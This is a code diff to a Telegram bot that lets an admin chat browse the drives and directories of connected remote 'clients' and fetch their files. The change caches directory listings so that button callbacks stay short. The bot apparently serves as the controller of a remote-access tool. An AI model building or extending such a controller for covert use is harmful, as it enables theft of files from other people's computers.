@@ -186,6 +186,25 @@ async function handleCallbackQuery(callbackQuery) {
     
     bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
 
+    // --- NEW: Item Selection from Cache ---
+    if (action === 'select_item') {
+        const [cacheKey, itemIndex] = params;
+        const items = cache.get(cacheKey);
+        const selectedItem = items?.[parseInt(itemIndex)];
+
+        if (!selectedItem) {
+            return bot.editMessageText('❌ Error: This selection has expired or is invalid. Please start over.', {
+                chat_id: message.chat.id, message_id: message.message_id,
+                reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
+            });
+        }
+        
+        // Construct the original callback_data and re-process it
+        const newAction = selectedItem.isDirectory ? 'list_dir' : 'get_file';
+        const newCallbackData = `${newAction}:${cache.get(`${cacheKey}_clientId`)}:${btoa(selectedItem.path)}`;
+        return handleCallbackQuery({ ...callbackQuery, data: newCallbackData });
+    }
+
     // --- Remote Control Actions ---
     if (['select_client', 'list_dir', 'get_file'].includes(action)) {
         const clientId = params[0];
@@ -268,22 +287,33 @@ async function handleResultFromClient(data) {
     }
 
     if (type === 'get_drives_result') {
-        const keyboard = payload.drives.map(drive => [{ text: `💽 ${drive}`, callback_data: `list_dir:${clientId}:${btoa(drive)}` }]);
+        const drives = payload.drives;
+        const keyboard = drives.map(drive => [{ text: `💽 ${drive}`, callback_data: `list_dir:${clientId}:${btoa(drive)}` }]);
         keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
         return bot.sendMessage(ADMIN_CHAT_ID, `Select a drive to browse on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
     }
 
     if (type === 'list_dir_result') {
         const { path: currentPath, items } = payload;
-        const keyboard = items.map(item => {
+
+        // --- FIX: Cache the result and generate short callbacks ---
+        const cacheKey = `dir:${clientId}:${Date.now()}`;
+        cache.set(cacheKey, items, 300); // Cache for 5 minutes
+        cache.set(`${cacheKey}_clientId`, clientId, 300); // Also cache the client ID for context
+
+        const keyboard = items.map((item, index) => {
             const icon = item.isDirectory ? '📁' : '📄';
-            return [{ text: `${icon} ${item.name}`, callback_data: `${item.isDirectory ? 'list_dir' : 'get_file'}:${clientId}:${btoa(item.path)}` }];
+            // Use the short, safe callback_data
+            return [{ text: `${icon} ${item.name}`, callback_data: `select_item:${cacheKey}:${index}` }];
         });
+        
         if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
              const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\'));
+             // The "Go Up" button still uses the full path as it's less likely to be too long
              keyboard.unshift([{ text: '⬆️ Go Up', callback_data: `list_dir:${clientId}:${btoa(parentDir || currentPath.slice(0, 3))}` }]);
         }
         keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+        
         return bot.sendMessage(ADMIN_CHAT_ID, `Contents of \`${currentPath}\` on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
     }
     
